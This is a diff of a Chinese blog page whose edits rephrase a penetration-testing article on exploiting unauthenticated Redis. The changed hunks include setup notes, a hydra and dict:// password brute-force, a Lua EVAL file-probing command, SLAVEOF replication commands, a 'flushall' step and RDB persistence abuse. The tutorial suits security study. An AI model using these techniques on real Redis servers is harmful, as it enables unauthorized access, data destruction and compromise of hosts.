@@ -442,7 +442,7 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    4.1k
+                    4.2k
                 </div>
                 
 
@@ -459,13 +459,13 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h2 id="0x01-简介"><a href="#0x01-简介" class="headerlink" title="0x01 简介"></a>0x01 简介</h2><p>Redis 是一种开源、基于内存的数据结构存储，被用作数据库、缓存和消息代理。其在低版本(&lt;3.2.0 ，从 3.2.0 版本开始，当 Redis 使用默认配置（绑定所有接口）并且没有任何密码来访问它时，它会进入一种称为保护模式的特殊 模式。在这种模式下，Redis 只回复来自环回接口的查询，并回复从其他地址连接的其他客户端有错误，解释发生了什么以及如何正确配置 Redis。)上默认配置绑定在0.0.0.0:6379上且未设置密码验证，导致未授权访问，可结合其他命令组合获取权限。Redis安全性介绍 <a target="_blank" rel="noopener" href="https://redis.io/topics/security">https://redis.io/topics/security</a> 。</p>
+                <h2 id="0x01-简介"><a href="#0x01-简介" class="headerlink" title="0x01 简介"></a>0x01 简介</h2><p>Redis 是一种开源、基于内存的数据结构存储，被用作数据库、缓存和消息代理。其在低版本(&lt;3.2.0 ，从 3.2.0 版本开始，当 Redis 使用默认配置（绑定所有接口）并且没有任何密码来访问它时，它会进入一种称为保护模式的特殊模式。在这种模式下，Redis 只回复来自环回接口的查询，并回复从其他地址连接的客户端有错误，解释发生了什么以及如何正确配置 Redis。)上默认配置绑定在0.0.0.0:6379上且未设置密码验证，导致未授权访问，可结合其他命令组合获取权限。Redis安全性介绍 <a target="_blank" rel="noopener" href="https://redis.io/topics/security">https://redis.io/topics/security</a> 。</p>
 <h2 id="0x02-环境搭建"><a href="#0x02-环境搭建" class="headerlink" title="0x02 环境搭建"></a>0x02 环境搭建</h2><p>环境根据需要选择，Ubuntu/Centos/Windows下环境搭建可以参考下列记录：</p>
-<h3 id="Redis连接-管理工具"><a href="#Redis连接-管理工具" class="headerlink" title="Redis连接/管理工具"></a>Redis连接/管理工具</h3><p>1.<a target="_blank" rel="noopener" href="https://redis.io/topics/rediscli">Redis-cli</a>，<a target="_blank" rel="noopener" href="https://github.com/yanghaoi/exploits/tree/master/Redis">可执行文件下载</a>。Redis 命令行界面 ，Redis安装完成后自带，命令格式<code>redis-cli -h host -p port -a password command</code>:<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/d8404e2e7e21ff91cb8d5c33e8bb6162.png"></p>
-<p>2.<a target="_blank" rel="noopener" href="https://github.com/caoxinyu/RedisClient">RedisClient</a> ，GUI管理工具，有exe和Jar包两种执行文件：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/b9c3e605076e53db04eacead51fa9d22.png"></p>
-<p>3.<a target="_blank" rel="noopener" href="https://github.com/lloy1231/RedisDesktopManager-Windows">redis-desktop-manager</a> ，开源的可视化工具，安装包新版本需要付费<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/832c0d96d1647bc1aa55340600d03ca9.png"></p>
+<h3 id="Redis连接-管理工具"><a href="#Redis连接-管理工具" class="headerlink" title="Redis连接/管理工具"></a>Redis连接/管理工具</h3><p>1.链接工具包括<a target="_blank" rel="noopener" href="https://redis.io/topics/rediscli">Redis-cli</a>和打包好的二进制<a target="_blank" rel="noopener" href="https://github.com/yanghaoi/exploits/tree/master/Redis">管理工具</a>。Redis-cli是Redis的默认连接工具，安装完成后自带。其命令格式为<code>redis-cli -h host -p port -a password command</code>:<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/d8404e2e7e21ff91cb8d5c33e8bb6162.png"></p>
+<p>2.<a target="_blank" rel="noopener" href="https://github.com/caoxinyu/RedisClient">RedisClient</a> ，是一个带GUI的管理工具，有exe和Jar包两种执行文件：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/b9c3e605076e53db04eacead51fa9d22.png"></p>
+<p>3.<a target="_blank" rel="noopener" href="https://github.com/lloy1231/RedisDesktopManager-Windows">redis-desktop-manager</a> ，开源的可视化工具，新版本的安装包需要付费：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/832c0d96d1647bc1aa55340600d03ca9.png"></p>
 <p>4.<a target="_blank" rel="noopener" href="https://github.com/qishibo/AnotherRedisDesktopManager">AnotherRedisDesktopManager</a>，另一个可视化管理工具，开源免费：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/f198fabfa3bbec5e98742d65133b75af.png"></p>
-<h3 id="Redis-Install-For-Linux"><a href="#Redis-Install-For-Linux" class="headerlink" title="Redis Install For Linux"></a>Redis Install For Linux</h3><p><a target="_blank" rel="noopener" href="https://github.com/redis/redis">Redis仓库</a>     <a target="_blank" rel="noopener" href="https://redis.io/download">官网下载地址</a><br>以源码编译安装的方式在Linux下搭建3.2.0来验证默认配置下的保护模式，然后安装3.0.7版本在默认配置下进行利用，最后安装4.x/5.x/6.x配置未授权进行利用。</p>
+<h3 id="Redis-Install-For-Linux"><a href="#Redis-Install-For-Linux" class="headerlink" title="Redis Install For Linux"></a>Redis Install For Linux</h3><p>在Linux上安装Redis，一般可以以源码编译方式安装，源码详见：<a target="_blank" rel="noopener" href="https://github.com/redis/redis">Redis仓库</a>     <a target="_blank" rel="noopener" href="https://redis.io/download">官网下载地址</a> 。<br>环境搭建首先以源码编译安装的方式在Linux下搭建3.2.0来验证默认配置下的保护模式，然后安装3.0.7版本在默认配置下进行利用，最后安装4.x/5.x/6.x配置未授权进行利用。</p>
 <p>1.先安装下3.2.0版本，观察在3.2.0的默认配置下是否如官网描述的安全性情况：</p>
 <pre class="line-numbers language-shell"><code class="language-shell">$ wget https://download.redis.io/releases/redis-3.2.0.tar.gz
 $ tar xzf redis-3.2.0.tar.gz
@@ -512,7 +512,7 @@ yum <span class="token function">install</span> -y <span class="token function">
 系统初始账号:admin
 系统初始密码:hLQGQ6HGP9
 <span class="token comment" spellcheck="true">#ssh -fgN -L 8080:localhost:80 localhost</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<h3 id="Redis-Install-For-Windows"><a href="#Redis-Install-For-Windows" class="headerlink" title="Redis Install For Windows"></a>Redis Install For Windows</h3><p><a target="_blank" rel="noopener" href="https://github.com/dmajkic/redis/downloads">Redis&lt;2.4.5安装包</a> ， <a target="_blank" rel="noopener" href="https://www.xp.cn/download.html">PHPStudy-Redis3.0.504</a> ， <a target="_blank" rel="noopener" href="https://github.com/microsoftarchive/redis/releases">Redis-x64-3.2.100.msi</a><br>分别是2.4.5，3.0.504，3.2.100三个版本，启动后为当前用户权限：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/4a64eea99d9856ecf4545f935aff74ac.png"><br>Redis-x64-3.2.100.msi安装后会以服务形式启动：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/eb11327e4b205370d64d7e2b55e1cb7e.png"></p>
+<h3 id="Redis-Install-For-Windows"><a href="#Redis-Install-For-Windows" class="headerlink" title="Redis Install For Windows"></a>Redis Install For Windows</h3><p>Windows下找到的几个版本安装包：<a target="_blank" rel="noopener" href="https://github.com/dmajkic/redis/downloads">Redis&lt;2.4.5安装包</a> ， <a target="_blank" rel="noopener" href="https://www.xp.cn/download.html">PHPStudy-Redis3.0.504</a> ， <a target="_blank" rel="noopener" href="https://github.com/microsoftarchive/redis/releases">Redis-x64-3.2.100.msi</a>分别是2.4.5，3.0.504，3.2.100三个版本，PHPStudy中启动效果：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/4a64eea99d9856ecf4545f935aff74ac.png"><br>Redis-x64-3.2.100.msi安装后会以服务形式启动：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/eb11327e4b205370d64d7e2b55e1cb7e.png"></p>
 <h2 id="0x03-利用方式"><a href="#0x03-利用方式" class="headerlink" title="0x03 利用方式"></a>0x03 利用方式</h2><h3 id="密码爆破"><a href="#密码爆破" class="headerlink" title="密码爆破"></a>密码爆破</h3><p><strong>Dict协议</strong></p>
 <pre class="line-numbers language-html"><code class="language-html">dict://192.168.200.97:6379/auth:password<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p><strong>Metasploit模块</strong></p>
@@ -524,7 +524,7 @@ run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span>
 <pre class="line-numbers language-stylus"><code class="language-stylus"><span class="token property-declaration"><span class="token property">hydra</span> -P redis_pass<span class="token operator">.</span>txt redis<span class="token punctuation">:</span></span><span class="token comment" spellcheck="true">//192.168.0.100</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/bd5f9c678d6039c2e3f460c025ca20a3.png"></p>
 <p><strong>超级弱口令工具</strong><br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/6de20cd9b8d9e90a395bc957b2b20b2a.png"></p>
-<h3 id="信息获取"><a href="#信息获取" class="headerlink" title="信息获取"></a>信息获取</h3><p> <code>CLIENT LIST</code>    #获取客户端连接信息<br> <img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/b84eb1177fba33809271c0dd872b5e99.png"></p>
+<h3 id="信息获取"><a href="#信息获取" class="headerlink" title="信息获取"></a>信息获取</h3><p>主要是利用一些命令获取信息：<br> <code>CLIENT LIST</code>    #获取客户端连接信息<br> <img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/b84eb1177fba33809271c0dd872b5e99.png"></p>
 <p><code>EVAL "return dofile('C:/Users/yanghao/NTUSER.DAT')" 0</code> #探测文件是否存在(&gt;2.6.0)<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/fe9fd97c62e0cc0443e241422100b2fc.png" alt="enter description here"></p>
 <pre class="line-numbers language-cmd"><code class="language-cmd">#检测 redis 服务是否启动
 ping
@@ -573,7 +573,7 @@ SLAVEOF host port / REPLICAOF host port
 
 #断开主从连接
 SLAVEOF ON ONE<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<h3 id="Ridis持久化-数据集备份-利用"><a href="#Ridis持久化-数据集备份-利用" class="headerlink" title="Ridis持久化(数据集备份)利用"></a>Ridis持久化(数据集备份)利用</h3><p>Redis持久化是指可以将数据集保存到本地磁盘中的操作，有RDB和AOF两种方式，详见 <a target="_blank" rel="noopener" href="https://redis.io/topics/persistence">https://redis.io/topics/persistence</a> ，可利用数据备份将数据写入到磁盘，但是写入数据会包含Redis备份的标记存在脏数据，只能用于一些有容错性的利用。</p>
+<h3 id="Ridis持久化-数据集备份-利用"><a href="#Ridis持久化-数据集备份-利用" class="headerlink" title="Ridis持久化(数据集备份)利用"></a>Ridis持久化(数据集备份)利用</h3><p>Redis持久化是指可以将数据集保存到本地磁盘中的操作，有RDB和AOF两种方式，详见 <a target="_blank" rel="noopener" href="https://redis.io/topics/persistence%E3%80%82%E9%80%9A%E8%BF%87%E6%95%B0%E6%8D%AE%E5%A4%87%E4%BB%BD%E6%93%8D%E4%BD%9C%E5%B0%86%E6%95%B0%E6%8D%AE%E5%86%99%E5%85%A5%E5%88%B0%E7%A3%81%E7%9B%98%E4%B8%AD%E8%BF%9B%E8%A1%8C%E5%88%A9%E7%94%A8%EF%BC%8C%E4%BD%86%E6%98%AF%E6%9F%90%E4%BA%9B%E6%A0%BC%E5%BC%8F%E5%86%99%E5%85%A5%E6%95%B0%E6%8D%AE%E7%9A%84%E4%BC%9A%E5%8C%85%E5%90%ABRedis%E5%A4%87%E4%BB%BD%E7%9A%84%E6%A0%87%E8%AE%B0%E5%AD%98%E5%9C%A8%E8%84%8F%E6%95%B0%E6%8D%AE%EF%BC%8C%E8%BF%99%E5%8F%AA%E8%83%BD%E7%94%A8%E4%BA%8E%E4%B8%80%E4%BA%9B%E6%9C%89%E5%AE%B9%E9%94%99%E6%80%A7%E7%9A%84%E5%88%A9%E7%94%A8%E3%80%82">https://redis.io/topics/persistence。通过数据备份操作将数据写入到磁盘中进行利用，但是某些格式写入数据的会包含Redis备份的标记存在脏数据，这只能用于一些有容错性的利用。</a></p>
 <h4 id="RDB备份文件利用"><a href="#RDB备份文件利用" class="headerlink" title="RDB备份文件利用"></a>RDB备份文件利用</h4><pre class="line-numbers language-cmd"><code class="language-cmd">DBSIZE                   # 统计KEYS
 flushall                  # 如果键过多导致备份过大，全部清空KEYS(危险)
 CONFIG GET slave-read-only      # 查询只读配置
@@ -1382,7 +1382,7 @@ system.exec 'id'<span aria-hidden="true" class="line-numbers-rows"><span></span>
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">26.4k</span>&nbsp;字
+                class="white-color">26.5k</span>&nbsp;字
             
             
             
